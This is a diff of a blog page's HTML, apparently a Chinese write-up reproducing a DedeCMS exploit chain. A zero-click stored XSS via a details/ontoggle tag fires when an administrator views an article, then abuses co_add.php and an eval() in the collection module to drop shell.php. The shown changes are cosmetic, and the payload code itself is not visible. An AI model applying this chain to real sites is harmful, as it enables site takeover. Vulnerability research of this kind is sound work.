-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915851.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915851.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>接下来就是 <code>dedecollection.class.php LoadItemConfig()</code>从 <code>$itemconfig</code> 中提取 <code>function</code> 字段，在后续执行<code>eval()</code>。</p>
 <h3 id="总结利用链">总结利用链<a hidden class="anchor" aria-hidden="true" href="#总结利用链">#</a></h3>
 <h4 id="阶段1--恶意代码存储">阶段1 — 恶意代码存储<a hidden class="anchor" aria-hidden="true" href="#阶段1--恶意代码存储">#</a></h4>
@@ -1145,14 +1141,14 @@ document.addEventListener('DOMContentLoaded', () => {
 <h1 id="xss后台rce组合拳-0click-劫持-导致的前台-rce-getshell">xss+后台rce组合拳 0click 劫持 导致的前台 rce getshell<a hidden class="anchor" aria-hidden="true" href="#xss后台rce组合拳-0click-劫持-导致的前台-rce-getshell">#</a></h1>
 <h2 id="漏洞复现-2">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现-2">#</a></h2>
 <p>随便注册一个账号：</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917429.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917429.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>选择发表文章 /member/article_add.php</p>
 <p>这里随便填入内容，并进行抓包</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918733.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917166.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918799.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918733.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917166.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918799.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>对数据包进行修改，在内容处插入 payload：</p>
-<div class="code-block-container" id="code-1779933344379894200" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344379894200">
+<div class="code-block-container" id="code-1779947699556692200" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699556692200">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1164,12 +1160,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344379894200" title="Toggle" aria-expanded="false" aria-controls="code-1779933344379894200" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699556692200" title="Toggle" aria-expanded="false" aria-controls="code-1779947699556692200" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344379894200-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699556692200-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -1303,17 +1299,17 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span><span class="line"><span class="cl">------WebKitFormBoundaryVkolGBB9b1qYBTzr--</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916878.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916878.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>在后台管理页面中，test555 是插入 payload 的文章</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915664.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915664.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>管理员打开文章后弹出弹窗，并且在网站根目录下生成 shell.php</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915135.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="873" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915341.png" style="max-width: 100%; height: auto; aspect-ratio: 2038 / 873;" width="2038"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917201.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="1040" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917659.png" style="max-width: 100%; height: auto; aspect-ratio: 1542 / 1040;" width="1542"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915135.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="873" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915341.png" style="max-width: 100%; height: auto; aspect-ratio: 2038 / 873;" width="2038"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917201.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1040" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917659.png" style="max-width: 100%; height: auto; aspect-ratio: 1542 / 1040;" width="1542"></p>
 <h2 id="payload-分析">payload 分析<a hidden class="anchor" aria-hidden="true" href="#payload-分析">#</a></h2>
 <h3 id="完整-payload">完整 payload：<a hidden class="anchor" aria-hidden="true" href="#完整-payload">#</a></h3>
-<div class="code-block-container" id="code-1779933344382672100" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344382672100">
+<div class="code-block-container" id="code-1779947699559175300" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699559175300">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1325,12 +1321,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344382672100" title="Toggle" aria-expanded="false" aria-controls="code-1779933344382672100" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699559175300" title="Toggle" aria-expanded="false" aria-controls="code-1779947699559175300" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344382672100-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699559175300-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -1424,7 +1420,7 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span><span class="line"><span class="cl">  <span class="o">&lt;/</span><span class="nx">details</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><div class="code-block-container" id="code-1779933344384470000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344384470000">
+</div><div class="code-block-container" id="code-1779947699563714900" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699563714900">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1436,12 +1432,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344384470000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344384470000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699563714900" title="Toggle" aria-expanded="false" aria-controls="code-1779947699563714900" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344384470000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699563714900-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -1617,7 +1613,7 @@ document.addEventListener('DOMContentLoaded', () => {
 <pre><code>页面渲染时自动触发，不需要用户点击。管理员在后台审核文章时，打开页面即触发 ontoggle 事件执行 JavaScript。
 </code></pre>
 <h4 id="2-第一阶段--创建采集节点">2. 第一阶段 — 创建采集节点<a hidden class="anchor" aria-hidden="true" href="#2-第一阶段--创建采集节点">#</a></h4>
-<div class="code-block-container" id="code-1779933344385514600" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344385514600">
+<div class="code-block-container" id="code-1779947699564211200" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699564211200">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1629,12 +1625,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344385514600" title="Toggle" aria-expanded="false" aria-controls="code-1779933344385514600" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699564211200" title="Toggle" aria-expanded="false" aria-controls="code-1779947699564211200" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344385514600-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699564211200-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -1668,7 +1664,7 @@ document.addEventListener('DOMContentLoaded', () => {
 </div></div>
 </div><p>向 co_add.php 发送 step=2&amp;dopost=preview，进入 co_add.php:95 的 else 分支，在 #@__co_note 表中 INSERT 一条新记录，返回的 HTML 中包含 name=&lsquo;nid&rsquo; value=&rsquo;&hellip;&rsquo;，用正则提取 nid。</p>
 <h4 id="3-第二阶段--注入恶意代码并触发执行">3. 第二阶段 — 注入恶意代码并触发执行<a hidden class="anchor" aria-hidden="true" href="#3-第二阶段--注入恶意代码并触发执行">#</a></h4>
-<div class="code-block-container" id="code-1779933344387140200" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344387140200">
+<div class="code-block-container" id="code-1779947699564707900" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699564707900">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1680,12 +1676,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344387140200" title="Toggle" aria-expanded="false" aria-controls="code-1779933344387140200" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699564707900" title="Toggle" aria-expanded="false" aria-controls="code-1779947699564707900" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344387140200-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699564707900-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -2190,13 +2186,24 @@ document.addEventListener('DOMContentLoaded', function() {
     var overlay = document.getElementById('lightbox-overlay');
     if (!overlay) return;
     var lbImg = overlay.querySelector('.lightbox-img');
+    var prevBtn = overlay.querySelector('.lightbox-prev');
+    var nextBtn = overlay.querySelector('.lightbox-next');
+    var images = Array.from(document.querySelectorAll('.post-content img'));
+    var currentIndex = 0;
 
-    document.querySelectorAll('.post-content img').forEach(function(img) {
+    function showImage(index) {
+        if (!images.length) return;
+        currentIndex = (index + images.length) % images.length;
+        var img = images[currentIndex];
+        lbImg.src = img.currentSrc || img.src;
+        lbImg.alt = img.alt || '';
+    }
+
+    images.forEach(function(img, index) {
         img.style.cursor = 'zoom-in';
         img.addEventListener('click', function(e) {
             e.preventDefault();
-            lbImg.src = this.src;
-            lbImg.alt = this.alt || '';
+            showImage(index);
             overlay.classList.add('active');
             overlay.setAttribute('aria-hidden', 'false');
             document.body.style.overflow = 'hidden';
@@ -2209,12 +2216,27 @@ document.addEventListener('DOMContentLoaded', function() {
         document.body.style.overflow = '';
     }
 
+    function isOpen() {
+        return overlay.classList.contains('active');
+    }
+
     overlay.addEventListener('click', function(e) {
-        if (e.target !== lbImg) closeLightbox();
+        if (e.target !== lbImg && !e.target.closest('.lightbox-nav')) closeLightbox();
     });
     overlay.querySelector('.lightbox-close').addEventListener('click', closeLightbox);
+    prevBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        showImage(currentIndex - 1);
+    });
+    nextBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        showImage(currentIndex + 1);
+    });
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape' && overlay.classList.contains('active')) closeLightbox();
+        if (!isOpen()) return;
+        if (e.key === 'Escape') closeLightbox();
+        if (e.key === 'ArrowLeft') showImage(currentIndex - 1);
+        if (e.key === 'ArrowRight') showImage(currentIndex + 1);
     });
 })();
 </script>
@@ -2571,88 +2593,6 @@ document.addEventListener('DOMContentLoaded', function() {
 (function() {
     if (window.innerWidth < 768) return;
 
-    var IDLE_MS = 10000;
-    var timer = null;
-    var visible = false;
-
-    
-    var cat = document.createElement('div');
-    cat.setAttribute('aria-hidden', 'true');
-    cat.style.cssText = 'position:fixed;bottom:-60px;right:40px;z-index:9997;pointer-events:none;'
-        + 'transition:bottom .6s cubic-bezier(.34,1.56,.64,1);will-change:bottom';
-
-    
-    cat.innerHTML = '<svg viewBox="0 0 120 100" width="120" height="100" xmlns="http://www.w3.org/2000/svg">'
-        
-        + '<ellipse cx="38" cy="88" rx="12" ry="7" fill="var(--primary)" opacity=".18"/>'
-        + '<ellipse cx="82" cy="88" rx="12" ry="7" fill="var(--primary)" opacity=".18"/>'
-        + '<path d="M28 90 Q30 78 38 76 Q46 78 48 90" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.5"/>'
-        + '<path d="M72 90 Q74 78 82 76 Q90 78 92 90" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.5"/>'
-        
-        + '<ellipse cx="38" cy="85" rx="3" ry="2" fill="var(--primary)" opacity=".25"/>'
-        + '<ellipse cx="82" cy="85" rx="3" ry="2" fill="var(--primary)" opacity=".25"/>'
-        
-        + '<ellipse cx="60" cy="52" rx="28" ry="24" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8"/>'
-        
-        + '<path d="M36 38 L30 14 L48 30 Z" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8" stroke-linejoin="round"/>'
-        + '<path d="M84 38 L90 14 L72 30 Z" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8" stroke-linejoin="round"/>'
-        
-        + '<path d="M37 35 L33 18 L46 31 Z" fill="var(--primary)" opacity=".12"/>'
-        + '<path d="M83 35 L87 18 L74 31 Z" fill="var(--primary)" opacity=".12"/>'
-        
-        + '<g class="idle-cat-eyes">'
-        + '<ellipse cx="48" cy="50" rx="5" ry="5.5" fill="var(--primary)"/>'
-        + '<ellipse cx="72" cy="50" rx="5" ry="5.5" fill="var(--primary)"/>'
-        + '<ellipse cx="49" cy="48.5" rx="2" ry="2" fill="var(--secondary)"/>'
-        + '<ellipse cx="73" cy="48.5" rx="2" ry="2" fill="var(--secondary)"/>'
-        + '</g>'
-        
-        + '<path d="M58 56 L60 59 L62 56 Z" fill="var(--primary)" opacity=".5"/>'
-        
-        + '<path d="M60 59 Q56 63 52 60" fill="none" stroke="var(--primary)" stroke-width="1.2" stroke-linecap="round" opacity=".45"/>'
-        + '<path d="M60 59 Q64 63 68 60" fill="none" stroke="var(--primary)" stroke-width="1.2" stroke-linecap="round" opacity=".45"/>'
-        
-        + '<line x1="20" y1="52" x2="42" y2="54" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="20" y1="58" x2="42" y2="58" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="78" y1="54" x2="100" y2="52" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="78" y1="58" x2="100" y2="58" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '</svg>';
-
-    document.body.appendChild(cat);
-
-    function show() {
-        if (visible) return;
-        visible = true;
-        cat.style.bottom = '-10px';
-    }
-
-    function hide() {
-        if (!visible) return;
-        visible = false;
-        cat.style.bottom = '-60px';
-    }
-
-    function resetTimer() {
-        hide();
-        clearTimeout(timer);
-        timer = setTimeout(show, IDLE_MS);
-    }
-
-    ['mousemove', 'mousedown', 'keydown', 'scroll', 'touchstart'].forEach(function(evt) {
-        document.addEventListener(evt, resetTimer, { passive: true });
-    });
-
-    timer = setTimeout(show, IDLE_MS);
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    if (window.innerWidth < 768) return;
-
     var MAX_DEG = 4;
 
     document.querySelectorAll('.post-entry').forEach(function(card) {
@@ -2753,45 +2693,6 @@ document.addEventListener('DOMContentLoaded', function() {
             localStorage.setItem("pref-theme", 'dark');
         }
     })
-</script>
-<script>
-    document.querySelectorAll('pre > code').forEach((codeblock) => {
-        const container = codeblock.parentNode.parentNode;
-        const copybutton = document.createElement('button');
-        copybutton.classList.add('copy-code');
-        copybutton.innerHTML = 'copy';
-
-        function copyingDone() {
-            copybutton.innerHTML = 'copied!';
-            setTimeout(() => {
-                copybutton.innerHTML = 'copy';
-            }, 2000);
-        }
-
-        copybutton.addEventListener('click', (cb) => {
-            if ('clipboard' in navigator) {
-                navigator.clipboard.writeText(codeblock.textContent);
-                copyingDone();
-                return;
-            }
-            const range = document.createRange();
-            range.selectNodeContents(codeblock);
-            const selection = window.getSelection();
-            selection.removeAllRanges();
-            selection.addRange(range);
-            try { document.execCommand('copy'); copyingDone(); } catch (e) { };
-            selection.removeRange(range);
-        });
-
-        if (container.classList.contains("highlight")) {
-            container.appendChild(copybutton);
-        } else if (container.parentNode.firstChild == container) {
-        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
-            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
-        } else {
-            codeblock.parentNode.appendChild(copybutton);
-        }
-    });
 </script>
 </body>
 
